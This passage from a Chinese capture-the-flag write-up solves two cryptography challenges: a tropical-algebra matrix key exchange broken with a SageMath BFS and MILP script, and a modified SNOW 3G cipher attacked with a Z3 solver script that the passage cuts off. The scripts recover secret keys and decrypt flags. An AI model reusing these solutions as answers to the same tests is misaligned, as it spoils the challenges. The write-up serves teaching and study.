25936006104816398848763294643512904630693904811536750235782575680411293175199570549996860116534266024308384180714695713618100179159977119007296705755953070), 1), T((31615764543418227150373442921161015409451108936314500861393677947051550933162949546187561013367933814896599731881101269513584622045221572075154020764512361, 50949495722383923450467000027237872771083805573000234418294909831420665122828991646804570819253182296812205730460526602238410908744385295715494642011670302, 30046376733822814103765285531048995146507960605403955905352285492803421698899750499229235828563608110872152287396352141368070462887490641150750721237422292), 1), T((42412320788124253533063206400551576729131594465524655377806305264624022657031210858092833905407348057192940956580541969162994621998664608689022932705010805, 41722776308503455194023736353172117616379289994860102256388308181587467322646894365138296587355774655670131726172260670602474307183431832658005316250259591, 33141704795610803493609332818313887844240274308367398166146465359318122729322587430370062722677928505281563314385970928708284534153482394744151492566179250), 1), T((48012745434332621396584488113647630947729168932608633314506536889521278032864187779212748888699966489663681681711567074222628207589154993924279559879827391, 39855583712515206790647150566616660542462662706581031024331409343613271029575770662057612731040945940589468990436532636582640370936909839068505824564044844, 25188815716452635213010317945277705379818788367565902933359613395807029048445722405238239396212666257298663490345006169980797800202370182280898367192802148), 1), T((41762711019166933764071076868925472749613798214152538601381658230945806603505373373834798127385143129338387641080659318001072939220928926690557266982359639, 34277139481010606729260221443601778536818183491835231204996543426754694062274204798603801381448654361234056919129425780726346748449579291681518959778528457, 37540810803967133152694623712827684021429797871197484980933279408625825236914617626714648810662229964299455516364038635594513146114608637784744928837016122), 1), T((44294202189489000362479727191614910088954380397439894805752367976691219274243261946753227729509581819102222500848447746127715581894512111372410536423864988, 35420101488265260446625873224557615880092242006554371712037873486517330249515557110362847156191412054880219741884482064441354912257906439559575568225019238, 34348685307771077652954701835940783288023616972268822447277820662644380301725478013496780863667377419513972167056905126387735948688035947317898010943085968), 1), T((26521977068305430001883305636856109473916344063944177276171464394533035871804582630483273427312063093759229980292944374535450435317155222661027880128717165, 55714349300611258677870072827274153621339465885137104854167457895540266725887719608396218590278161698701792186821677383368143141231859084699823197150932128, 27096924941155664888770292092890030072481416713902116103352562204564493091696985166932533820372174249878765889811176822007131115742925529861724897917936431), 1), T((37318533313011456384573069116246670793596829593154331792584091712105507595672843942388546319351477336055571204992385074184860435270598259274896792069215609, 46487629886730790421426809153208398466634950306996972692260856245707068925705622326729944358380754057559718182533411451732206539670905621642333871389521417, 30192253002943654278614339380154922770213730416865558364146742071079194122119822098073360714486494644288176916800795609347345187008917283455125669246693389), 1), T((28541929398233380940389980941119778278955516268008068131290152737705077749158792275253765672078672245251081844045285355777910527120306726208157523870633230, 51855505966430216097800172314445843854153095434534235334654793648884019256449537702769152406727477891918777748354669335978646270512447754039591441693724483, 28415088824337495911039195530686260819421862654480451819973228959034762237939954981772569780053228502867954272079906613778760870805829852917857669871987961), 1), T((111166317722373660512239430899063180779454502637093053482728158340733850718710433048642860616838228487987246176833869980667368806205044037833703838655783644, 25543506809192743709389543827233910573174284773946383351789791859259498546275127586196723703971906918804264316574242737266821632340619487685546415636666763, 61298660170059725482399912228598307546230558611193087617549081948795247484432917830178366845219415753177108110187364157689516628027196468629061373127914415), 0), T((39200414714376203213989589907310004153419615525069571220530154424172704212884895031048940143453711097964852749260290851149581395166445761958284395788069792, 40184955066492595674028946024593896730347902318691242147910421550636931852574285071954494927216391456769806198245632845571087144745380228543904123364281064, 31399233515103928437959708397781818213997073080766982645278097374405451694522712681200078855475943558520585769471729807026796601543470836028872187623600107), 1), T((37392569140515987521445083376011291432190819045220457737816677496434400354019909649297383714966615482308756472331891180479603198395890894117706963894105883, 52932879960706884151916912494337825434316723028398418155184754925631424061942751019354873474056955652506571579796052088443938492540685707512477833308705551, 29879157474965570448728881459411660138698452984365036345039912468613125403782493486075206027795602124008951832332152235062723693195962674727085204666047261), 1), T((48189125385222013904134846855401852751871304574430612254229304814006872077888170961202656607006029724605097697031331880129013198349333930731575875834604327, 43706160546826415895473648820272070279612207450258285993278153275798226261760653737688599242159548011364497575507786156808001890979732244454988507547294840, 32974485536753559838572928746676552836430766687328478605834092335127826434205330417216032921909922518418362859321771022402937764461954428320485975994804219), 1), T((39412521470443938459951758680274960237229991249284348592935365839606442231374119294067875959733224633800608336084232161722063290199042397664836607636021948, 49074036626525841571847011981509515667130352577795548635672090678975176592504569113727807290506271845723557141329044041054441621821274376852246077851497906, 31197321358147401470997784897207890885638898924943372061660579223083394550025463300915241987476656376998140214600882026834353448258866997783217976620098791), 1), T((47539515616264694135142717323775748772353508323058495477804657780328656024362333476944620828983824796750544381531449228967091515571598248733110210111953161, 36260523719333567430710133910701731200051100947233414941886388520965453001387964171154104036252427716928422768464951266931874332245879703478502151075563706, 37373591545109889497658219641190349013620290250158565420620906384435528941797360613560619009894223977436255061299838729289166376423080671361079412265641091), 1), T((50071006786586760733551367646465186111694090506345851682175367526074068695100222049863050431108263486514379241299237657093734158245181433414963479553458510, 37403485726588221148075785691657568543325159461952555448927718580728089188629316482913149810995185410574585591220007550646882496054206851356558759522054487, 34181466048913833997918297764303448280214109351229902886965447638454084006608221000342751062899371432650771711992705220082389178996507980894232494371710937), 1)]
    enc = b'*\xe0\xab\xb7?\xd2\xbf\xc5\xbf\x01^\x95\xfex(\xeas\x8cH\t\xc5\x9b\xf74\xfe\xc4tA\x03\t7\x9c<\xed7\xf5bRE\xdfT\xf1U\xcc\xbd\xff\xc2\n'
    '''
```

题目给出了一个名为 `algebraring` 的代数结构，并在此基础上实现了一个多方密钥交换协议。我们需要利用给出的 $P, K_1, K_6$ 恢复出共享密钥 $KA$，并用其哈希值作为 AES 密钥解密 flag。

**1.1 代数结构分析**

题目定义了一个元素类 `algebra`，每个元素由一个三元组 $t=(p, q, r)$ 和一个标记 $n \in \{0, 1\}$ 组成。

关键操作如下：

1. **映射函数 **`**f(self)**`：
    - 如果 $n=0$，返回自身 $(p,q,r)$。
    - 如果 $n=1$，返回新的元组 $(p+q+r, p-q+r, p+q-r)$，并将 $n$ 设为 0。
    - 这是一个线性变换。令 $v=(p,q,r)^T$，当 $n=1$ 时，$f(v) = Mv$，其中 $M = \begin{pmatrix} 1 & 1 & 1 \\ 1 & -1 & 1 \\ 1 & 1 & -1 \end{pmatrix}$。
2. **比较运算 (**`**__lt__**`** 等)**：
    - 比较逻辑主要基于 `f()` 之后的值。如果 `self.f() != other.f()`，则直接比较变换后的元组（字典序）。这类似于“极大加（Max-Plus）代数”中的比较。
3. **加法 (**`**__add__**`**)**：
    - `a + b` 返回 `a` 和 `b` 中 `f()` 值较大的那个（Winner-take-all）。
    - **性质**：这对应于 Tropical Semiring（热带半环）中的“加法”（即取最大值）。
4. **乘法 (**`**__mul__**`**)**：
    - `a * b` 对应元组的分量相加。
    - 但是在相加之前，必须确保两者的 $n$ 状态对齐（通过 `f()` 变换）。
    - **性质**：这对应于 Tropical Semiring 中的“乘法”（即普通加法）。

1**.2 协议流程**

协议生成了几个矩阵：

+ $P$：随机矩阵。
+ $C_1, C_2, \dots$：随机**循环矩阵**（Circulant Matrix）。由一行向量生成。
+ $K_1 = C_1 \times P \times C_2$。
+ $K_6 = C_5 \times K_2 \times C_6$。
+ 目标：$KA = C_1 \times K_6 \times C_2$。

这是一个典型的矩阵分解问题。我们需要从 $K_1 = C_1 P C_2$ 中求解出 $C_1$ 和 $C_2$ 的信息，然后应用到 $K_6$ 上得到 $KA$。

**攻击流程**：

由于题目中的运算定义在一种类似于“热带代数”的结构上，我们可以将其映射到一个线性空间进行求解。

2.**1 线性化 (f-space)**

定义映射 $\Phi(x) = x.f().t$，即取元素经过 `f()` 变换后的向量部分。

根据源码逻辑：

+ $\Phi(A * B) = \Phi(A) + \Phi(B)$ （向量加法）
+ $\Phi(A + B) \approx \max(\Phi(A), \Phi(B))$ （向量取极大值）

矩阵乘法 $K_1 = C_1 \times P \times C_2$ 在这种代数下展开，对于矩阵中的每个元素 $(i, j)$：

$$(K_1)_{ij} = \sum_{u, v}^{\text{tropical}} (C_1)_{iu} * P_{uv} * (C_2)_{vj}$$

$$(K_1)_{ij} = \max_{u, v} \{ (C_1)_{iu} * P_{uv} * (C_2)_{vj} \}$$

在 $\Phi$ 空间（即 f-space）中，乘法变加法，加法变 Max。这意味着对于给定的 $(i, j)$，求和项中存在唯一的一项 $(u, v)$ 使得该项的值等于 $(K_1)_{ij}$（Dominant Term）。

$$\Phi((K_1)_{ij}) = \Phi((C_1)_{iu}) + \Phi(P_{uv}) + \Phi((C_2)_{vj})$$

**2.2 利用循环矩阵性质**

$C_1$ 和 $C_2$ 是循环矩阵，分别由向量 $A$ 和 $B$ 生成。

+ $(C_1)_{iu} = A_{(u-i) \pmod N}$
+ $(C_2)_{vj} = B_{(j-v) \pmod N}$

带入上式：

$$\Phi((K_1)_{ij}) = \Phi(A_{(u-i)}) + \Phi(P_{uv}) + \Phi(B_{(j-v)})$$

这变成了一个线性方程组。只要我们能确定对于每个 $(i,j)$ 到底是哪个 $(u,v)$ 贡献了最大值（即 Winner），我们就能建立方程：

$$\Phi(A_x) + \Phi(B_y) = \Phi((K_1)_{ij}) - \Phi(P_{uv})$$

**2.3 确定 Winner**

在 512 bit 的大数随机生成下，Max 操作通常由数值极其显著的一项决定。

脚本中的 `winner` 数组是手动分析或爆破得到的。在实际做题时，可以通过以下方式找到：

1. 由于 $P$ 是已知的，观察 $P$ 中极大的元素位置。
2. 或者利用 $N=5$ 很小的特点，遍历所有可能的 $(u, v)$ 组合，看哪组能构建出一致的线性系统。
3. 脚本中直接给出了 `winner` 和 `nA`, `nB`（对应 $A, B$ 向量中每个元素的 $n$ 值），这通常是通过分析数据特征或少量爆破得到的。

**2.4 求解方程组 (BFS)**

方程形式为 $X_a + Y_b = \text{Const}$。

这是一个二分图结构。给定 $N=5$，这是一个连通图。

我们可以通过 BFS（广度优先搜索）：

1. 假设 $X_0 = (0,0,0)$。
2. 利用已知关系推出所有的 $Y_j$。
3. 利用推出的 $Y_j$ 反推其他的 $X_i$。
4. 最终得到的解是 $\Phi(A)$ 和 $\Phi(B)$ 的一组**特解**，记为 $Af_0, Bf_0$。

**2.5 处理 Gauge (自由度) 与 MILP**

方程 $X_a + Y_b = C$ 存在自由度：如果我们把所有的 $X$ 加上向量 $g$，把所有的 $Y$ 减去向量 $g$，等式依然成立。

$$\Phi(A) = Af_0 + g$$

$$\Phi(B) = Bf_0 - g$$

真实的 $A$ 和 $B$ 还必须满足题目中的 $n$ 值约束：

+ 如果 $nA[k] == 1$，那么 $\Phi(A_k)$ 必须能逆变换回一个合法的 $n=1$ 元组。
    - 即 $\Phi(A_k)$ 的分量必须满足奇偶性校验（才能被2整除）。
    - 逆变换后的 $p, q, r$ 必须在 $[0, 2^{512})$ 范围内。
+ 如果 $nA[k] == 0$，则约束较少（直接就是 f 值）。

这是一个典型的整数规划问题。脚本中使用 `MixedIntegerLinearProgram` (MILP) 来求解这个偏移向量 $g=(G_1, G_2, G_3)$。

exp

```text
from sage.all import *
from sage.structure.richcmp import richcmp
import re, sys
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

data_path = "/home/kali/桌面/date.txt"
print("[*] loading data from:", data_path)
text = open(data_path, "r", encoding="utf-8", errors="ignore").read()

# =========================================================
# ring (max-plus with ghost tie)
# =========================================================
class algebraring(UniqueRepresentation, Parent):
    def __init__(self):
        Parent.__init__(self, category=CommutativeRings())
    def _element_constructor_(self, x:tuple, n:int=None):
        if isinstance(x, algebra): return x
        if x == 0: return self.zero()
        if x == 1: return self.one()
        if isinstance(x, tuple) and n is not None:
            return algebra(self, x, int(n))
    def zero(self): return self(("-∞",), 0)
    def one(self):  return self((0,0,0), 1)

class algebra(CommutativeRingElement):
    def __init__(self, parent, t:tuple, n:int):
        super().__init__(parent)
        self.t = t
        self.n = int(n)

    def _richcmp_(self, other, op):
        if not isinstance(other, algebra):
            return richcmp(False, True, op)
        return richcmp((self.n, self.t), (other.n, other.t), op)

    def __repr__(self):
        return f"T{self.t, self.n}"

    def is_zero(self):
        return self.t == ("-∞",)

    def f(self):
        if self.is_zero(): return self.parent().zero()
        if self.n == 0: return self
        p,q,r = self.t
        return algebra(self.parent(), (p+q+r, p-q+r, p+q-r), 0)

    def __lt__(self, other:'algebra'):
        if self.is_zero(): return not other.is_zero()
        if other.is_zero(): return False
        if self.n != other.n: return self.f() < other.f()
        return self.t < other.t

    def __le__(self, other): return self<other or self==other
    def __gt__(self, other): return not self<=other
    def __ge__(self, other): return not self<other

    # max by f(); tie -> ghost(self.f())
    def __add__(self, other:'algebra'):
        sf = self.f(); of = other.f()
        c = (sf > of) - (sf < of)
        return [sf, self, other][c]

    def __mul__(self, other:'algebra'):
        if self.is_zero() or other.is_zero(): return self.parent().zero()
        if self.n == other.n:
            return algebra(self.parent(), tuple(i+j for i,j in zip(self.t, other.t)), self.n)
        elif self.n == 0 and other.n == 1:
            return algebra(self.parent(), tuple(i+j for i,j in zip(self.t, other.f().t)), 0)
        elif self.n == 1 and other.n == 0:
            return algebra(self.parent(), tuple(i+j for i,j in zip(self.f().t, other.t)), 0)
    def _mul_(self, other): return self.__mul__(other)

R = algebraring()
def T(tup, n): return algebra(R, tup, int(n))
ns = {"T": T}
def safe_eval(s):
    return eval(s, {"__builtins__": {}}, ns)

def grab_list(name):
    m = re.search(rf"{name}\s*=\s*(\[[\s\S]*?\])", text)
    if not m:
        raise ValueError(f"cannot find {name}")
    return safe_eval(m.group(1))

def grab_bytes(name):
    m = re.search(rf"{name}\s*=\s*(b['\"][\s\S]*?['\"])", text)
    if not m:
        raise ValueError(f"cannot find {name}")
    return eval(m.group(1), {"__builtins__": {}})

P_list  = grab_list("P")
K1_list = grab_list("K1")
K6_list = grab_list("K6")
enc     = grab_bytes("enc")

N = 5
P  = matrix(R, N, N, P_list)
K1 = matrix(R, N, N, K1_list)
K6 = matrix(R, N, N, K6_list)

# =========================================================
# recovered from your output
# =========================================================
winner = [[(0, 3), (0, 4), (0, 2), (2, 1), (0, 2)],
          [(1, 3), (0, 4), (3, 0), (2, 1), (1, 2)],
          [(2, 1), (0, 4), (2, 1), (2, 1), (0, 2)],
          [(0, 3), (0, 4), (3, 0), (2, 1), (0, 2)],
          [(1, 3), (0, 4), (1, 0), (2, 1), (1, 2)]]
nA = [1, 0, 1, 0, 0]
nB = [1, 0, 1, 0, 1]

def fvec(x):
    fx = x.f()
    if fx.is_zero(): return vector(ZZ,(0,0,0))
    return vector(ZZ, fx.t)

FP  = [[fvec(P[i,j])  for j in range(N)] for i in range(N)]
FK1 = [[fvec(K1[i,j]) for j in range(N)] for i in range(N)]

# =========================================================
# BFS solve Af0,Bf0 in f-space
# Af[a] + Bf[b] = FK1[i][j] - FP[u][v]
# =========================================================
adj = [[] for _ in range(10)]
for i in range(N):
    for j in range(N):
        u,v = winner[i][j]
        a = (u - i) % N
        b = (j - v) % N
        rhs = FK1[i][j] - FP[u][v]
        ai = a
        bi = 5 + b
        adj[ai].append((bi, rhs))
        adj[bi].append((ai, rhs))

val = [None]*10
def bfs(start):
    if val[start] is None:
        val[start] = vector(ZZ,(0,0,0))
    q=[start]
    while q:
        x=q.pop(0)
        for y,rhs in adj[x]:
            if val[y] is None:
                val[y] = rhs - val[x]
                q.append(y)
            else:
                if val[x] + val[y] != rhs:
                    raise SystemExit("[-] inconsistency (winner/nA/nB wrong).")

for node in range(10):
    if val[node] is None:
        bfs(node)

Af0 = [val[a] for a in range(N)]
Bf0 = [val[5+b] for b in range(N)]
print("[+] solved Af,Bf (f-space) by BFS.")

# =========================================================
# Gauge via MILP (RELAXED):
# - ONLY enforce n=1 constraints (p,q,r in [0,U))
# - n=0 has NO bounds (can be negative/huge)
# =========================================================
Bbits = 518
U = Integer(2)**Bbits
print(f"[*] searching gauge g with relaxed n=0, U=2^{Bbits}, solver=ppl ...")

mip = MixedIntegerLinearProgram(maximization=False, solver="ppl")
g = mip.new_variable(integer=True)
G1,G2,G3 = g[0],g[1],g[2]

pA = mip.new_variable(integer=True)
qA = mip.new_variable(integer=True)
rA = mip.new_variable(integer=True)
pB = mip.new_variable(integer=True)
qB = mip.new_variable(integer=True)
rB = mip.new_variable(integer=True)

def bound0(x):
    mip.add_constraint(x >= 0)
    mip.add_constraint(x <= U-1)

def add_n1_constraints(u,v,w, p,q,r):
    # enforce parity + range by introducing integer p,q,r
    mip.add_constraint(v + w == 2*p)
    mip.add_constraint(u - v == 2*q)
    mip.add_constraint(u - w == 2*r)
    bound0(p); bound0(q); bound0(r)

# A: Af = Af0 + g
for k in range(N):
    u = Af0[k][0] + G1
    v = Af0[k][1] + G2
    w = Af0[k][2] + G3
    if nA[k] == 1:
        add_n1_constraints(u,v,w, pA[k],qA[k],rA[k])

# B: Bf = Bf0 - g
for k in range(N):
    u = Bf0[k][0] - G1
    v = Bf0[k][1] - G2
    w = Bf0[k][2] - G3
    if nB[k] == 1:
        add_n1_constraints(u,v,w, pB[k],qB[k],rB[k])

mip.set_objective(0)
mip.solve()
gv = mip.get_values(g)
G1v,G2v,G3v = Integer(gv[0]), Integer(gv[1]), Integer(gv[2])
print("[+] found gauge g =", (G1v,G2v,G3v))

# =========================================================
# lift to tangible
# =========================================================
def inv_f_to_pqr_int(u,v,w):
    if (v+w) & 1 or (u-v) & 1 or (u-w) & 1:
        return None
    p = (v+w)//2
    q = (u-v)//2
    r = (u-w)//2
    return (p,q,r)

def lift_from_f(f3, n):
    u,v,w = map(Integer, f3)
    if n == 0:
        return T((u,v,w), 0)
    pqr = inv_f_to_pqr_int(u,v,w)
    if pqr is None:
        raise SystemExit("[-] lift parity fail (should not).")
    return T(tuple(map(Integer,pqr)), 1)

Arow = [lift_from_f((Af0[k][0]+G1v, Af0[k][1]+G2v, Af0[k][2]+G3v), nA[k]) for k in range(N)]
Brow = [lift_from_f((Bf0[k][0]-G1v, Bf0[k][1]-G2v, Bf0[k][2]-G3v), nB[k]) for k in range(N)]

def gen_circulant(row):
    return matrix(R, N, N, lambda i,j: row[(j-i)%N])

C1 = gen_circulant(Arow)
C2 = gen_circulant(Brow)

print("[*] verify K1 ...")
if C1*P*C2 != K1:
    raise SystemExit("[-] K1 verify failed (something wrong).")
print("[+] K1 verified!")

KA = C1*K6*C2

# =========================================================
# key derivations
# =========================================================
def mat_to_flat_str(M):
    return str([str(M[i,j]) for i in range(N) for j in range(N)])

def mat_to_flat_f_str(M):
    return str([str(M[i,j].f()) for i in range(N) for j in range(N)])

candidates = [
    ("md5(str(KA))", md5(str(KA).encode()).digest()),
    ("md5(repr(KA))", md5(repr(KA).encode()).digest()),
    ("md5(flat_str)", md5(mat_to_flat_str(KA).encode()).digest()),
    ("md5(flat_f_str)", md5(mat_to_flat_f_str(KA).encode()).digest()),
]

def looks_like_flag(pt):
    if b"{" in pt and b"}" in pt:
        # allow non-ascii a bit, but require braces region printable-ish
        return True
    return False

hit=False
for lab,key in candidates:
    pt = AES.new(key=key, mode=AES.MODE_CTR, nonce=b'gorilla').decrypt(enc)
    print(f"[*] trying {lab} -> {key.hex()}  head={pt[:16].hex()}")
    if looks_like_flag(pt):
        print("[+] HIT via", lab, "key=", key.hex())
        try:
            print("[+] flag =", unpad(pt,16))
        except Exception:
            print("[+] raw  =", pt)
        hit=True
        break

if not hit:
    print("[-] no hit. dump raw bytes =", AES.new(key=candidates[0][1], mode=AES.MODE_CTR, nonce=b'gorilla').decrypt(enc))
    print("[*] KA head:", str(KA)[:200])

```

脚**本逻辑：**

**1.重构了 **`**algebraring**`** 和 **`**algebra**`** 以在 SageMath 中本地运行。**

**2.建立方程 (BFS)：**

+ **利用硬编码的 **`**winner**`** 索引，计算 ****$RHS = \Phi(K_1) - \Phi(P)$****。**
+ **构建邻接表 **`**adj**`**。**
+ **运行 **`**bfs**`** 求解出基于 ****$f$****-space 的基础解 ****$Af_0$**** 和 ****$Bf_0$****。**

**3.约束求解 (MILP)：**

+ **引入变量 ****$g$****。**
+ **对于已知 ****$n=1$**** 的位置，添加约束：**
    - **$v+w = 2p$**
    - **$u-v = 2q$**
    - **$u-w = 2r$**
    - **$0 \le p, q, r < 2^{518}$**
+ **调用 **`**ppl**`**求解器找到满足所有奇偶性和范围约束的 ****$g$****。**

**4.提升 (Lift)：**

+ **将求解出的 ****$f$****-space 值加上/减去 ****$g$****。**
+ **逆向 **`**f()**`** 函数（**`**inv_f_to_pqr_int**`**）恢复出真实的 ****$(p,q,r)$**** 元组。**
+ **重建循环矩阵 ****$C_1, C_2$****。**

**5.验证与解密：**

+ **验证 ****$C_1 P C_2 == K_1$****。**
+ **计算目标 ****$KA = C_1 K_6 C_2$****。**
+ **尝试多种哈希方式（**`**str**`**, **`**repr**`** 等）作为 Key 解密 AES。**

![](/images/wp/unictf-wp/image-030.png)





### Subgroup-Spirit
题目给出了一个 Python 脚本，实现了一个流密码算法。通过分析代码结构（LFSR 线性反馈移位寄存器 + FSM 有限状态机），可以确认这是 **SNOW 3G** 算法的变体。

+ **LFSR**: 由 16 个 32 位寄存器 ($s_0, \dots, s_{15}$) 组成。
+ **FSM**: 由 3 个 32 位寄存器 ($R1, R2, R3$) 组成。

1.**2 关键修改** 

标准的 SNOW 3G 算法在生成每一个 Keystream Word 时，LFSR 只推进（Clock）一次。但本题在 `keystream_word` 函数中加入了一个条件分支：

```text
z = _u32(F ^ self.s[0])  # 生成密钥流字
if z & 1:                # 如果 z 的最低位(LSB)是 1
    self._clock_lfsr_keystream() # 额外推进一次 LFSR
self._clock_lfsr_keystream()     # 标准推进一次 LFSR
```

这意味着：

+ 若 Keystream $z$ 为 **奇数**，LFSR 此时刻推进 **2步**。
+ 若 Keystream $z$ 为 **偶数**，LFSR 此时刻推进 **1步**。
+ FSM 始终只推进 1 步。

**1.3 已知信息**

1. **明文与密文**: 提供了 `msg` (明文) 和 `cipher` (密文)。
    - 我们可以直接计算出密钥流：$Keystream = msg \oplus cipher$。
    - 这意味着我们完全掌握了每一个时刻 LFSR 是跳 1 步还是跳 2 步的时间表。
2. **状态泄露 (Leak)**: 题目提供了一个 `leak` 数组，包含了在特定时间步 ($t=2, 3, 5, 6, 7, 8$) 时，FSM 寄存器 ($R1, R2, R3$) 或 LFSR 寄存器 ($s_0$) 的值。
    - 最关键的是在 $t=2$ 时刻，泄露了完整的 FSM ($R1, R2, R3$) 和部分 LFSR ($s_0$)。

无法暴力破解

SNOW 3G 的内部状态空间高达 $32 \times (16+3) = 608$ bits。即使有泄露，暴力枚举初始种子也是不可能的。

手动逆向 容易失败

最初的思路可能是：利用 $t=2$ 的泄露状态，尝试编写逆向函数（Inverse Function）倒推回 $t=0$。

**难点在于**：

1. FSM 的更新是非线性的（涉及 S-Box）。虽然可以逆向，但编码繁琐。
2. LFSR 的倒推不仅要处理模 $2^{32}$ 和有限域乘法，还要根据 Keystream 的奇偶性判断倒退几步。
3. 最致命的是：$t=0$ 到 $t=2$ 中间涉及 FSM 和 LFSR 的复杂交互（$R1$ 的更新依赖 $s_5$），手动倒推极易出现“多算一步”或“少算一位”的偏差，导致结果错误。

** 最终方案**：基于 Z3 的正向约束求解 (Z3 Forward Solver)

利用 **Z3 SMT Solver** 的强大能力进行“填空”。

**核心逻辑：**

1. **将 ****$t=0$**** 的初始状态设为未知量**：声明 19 个 32 位 BitVec 变量（$S_{0\dots15}$ 和 $R1, R2, R3$）。
2. **正向模拟**：在 Z3 内部用约束表达式模拟密码机的运行过程（从 $t=0$ 跑 $t=8$）。
3. **添加约束**：
    - **Keystream 约束**：每一步计算出的 $z$ 必须等于 $msg \oplus cipher$ 算出的真实 $z$。
    - **Leak 约束**：当模拟器运行到 $t=2, 3 \dots$ 时，强制要求内部变量等于题目给出的泄露值。
    - **Glitch 约束**：利用已知 Keystream 的奇偶性，在 Z3 逻辑中控制 LFSR 是进行一次还是两次状态转移。
4. **求解**：Z3 会自动搜索满足所有 Keystream 和 Leak 条件的唯一初始状态 ($t=0$)。

exp

```text
from __future__ import annotations
import z3
from hashlib import sha1

# --- 1. 基础常量与 S-Box 定义 ---
SR = [
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
]

SQ = [
    0x25,0x24,0x73,0x67,0xD7,0xAE,0x5C,0x30,0xA4,0xEE,0x6E,0xCB,0x7D,0xB5,0x82,0xDB,
    0xE4,0x8E,0x48,0x49,0x4F,0x5D,0x6A,0x78,0x70,0x88,0xE8,0x5F,0x5E,0x84,0x65,0xE2,
    0xD8,0xE9,0xCC,0xED,0x40,0x2F,0x11,0x28,0x57,0xD2,0xAC,0xE3,0x4A,0x15,0x1B,0xB9,
    0xB2,0x80,0x85,0xA6,0x2E,0x02,0x47,0x29,0x07,0x4B,0x0E,0xC1,0x51,0xAA,0x89,0xD4,
    0xCA,0x01,0x46,0xB3,0xEF,0xDD,0x44,0x7B,0xC2,0x7F,0xBE,0xC3,0x9F,0x20,0x4C,0x64,
    0x83,0xA2,0x68,0x42,0x13,0xB4,0x41,0xCD,0xBA,0xC6,0xBB,0x6D,0x4D,0x71,0x21,0xF4,
    0x8D,0xB0,0xE5,0x93,0xFE,0x8F,0xE6,0xCF,0x43,0x45,0x31,0x22,0x37,0x36,0x96,0xFA,
    0xBC,0x0F,0x08,0x52,0x1D,0x55,0x1A,0xC5,0x4E,0x23,0x69,0x7A,0x92,0xFF,0x5B,0x5A,
    0xEB,0x9A,0x1C,0xA9,0xD1,0x7E,0x0D,0xFC,0x50,0x8A,0xB6,0x62,0xF5,0x0A,0xF8,0xDC,
    0x03,0x3C,0x0C,0x39,0xF1,0xB8,0xF3,0x3D,0xF2,0xD5,0x97,0x66,0x81,0x32,0xA0,0x00,
    0x06,0xCE,0xF6,0xEA,0xB7,0x17,0xF7,0x8C,0x79,0xD6,0xA7,0xBF,0x8B,0x3F,0x1F,0x53,
    0x63,0x75,0x35,0x2C,0x60,0xFD,0x27,0xD3,0x94,0xA5,0x7C,0xA1,0x05,0x58,0x2D,0xBD,
    0xD9,0xC7,0xAF,0x6B,0x54,0x0B,0xE0,0x38,0x04,0xC8,0x9D,0xE7,0x14,0xB1,0x87,0x9C,
    0xDF,0x6F,0xF9,0xDA,0x2A,0xC4,0x59,0x16,0x74,0x91,0xAB,0x26,0x61,0x76,0x34,0x2B,
    0xAD,0x99,0xFB,0x72,0xEC,0x33,0x12,0xDE,0x98,0x3B,0xC0,0x9B,0x3E,0x18,0x10,0x3A,
    0x56,0xE1,0x77,0xC9,0x1E,0x9E,0x95,0xA3,0x90,0x19,0xA8,0x6C,0x09,0xD0,0xF0,0x86
]

# --- 辅助函数：GF(2^8) 乘法与 Snow3G 常量表生成 ---
def _mulx(v: int, c: int) -> int:
    r = ((v << 1) & 0xFF)
    if v & 0x80: r ^= c
    return r

def _mulx_pow(v: int, i: int, c: int) -> int:
    for _ in range(i): v = _mulx(v, c)
    return v

def _mul_alpha_u32(c: int) -> int:
    b0 = _mulx_pow(c, 23, 0xA9); b1 = _mulx_pow(c, 245, 0xA9)
    b2 = _mulx_pow(c, 48, 0xA9); b3 = _mulx_pow(c, 239, 0xA9)
    return (b0 << 24) | (b1 << 16) | (b2 << 8) | b3

def _div_alpha_u32(c: int) -> int:
    b0 = _mulx_pow(c, 16, 0xA9); b1 = _mulx_pow(c, 39, 0xA9)
    b2 = _mulx_pow(c, 6, 0xA9); b3 = _mulx_pow(c, 64, 0xA9)
    return (b0 << 24) | (b1 << 16) | (b2 << 8) | b3

# 生成 MulA 和 DivA 表
MUL_A = [_mul_alpha_u32(i) for i in range(256)]
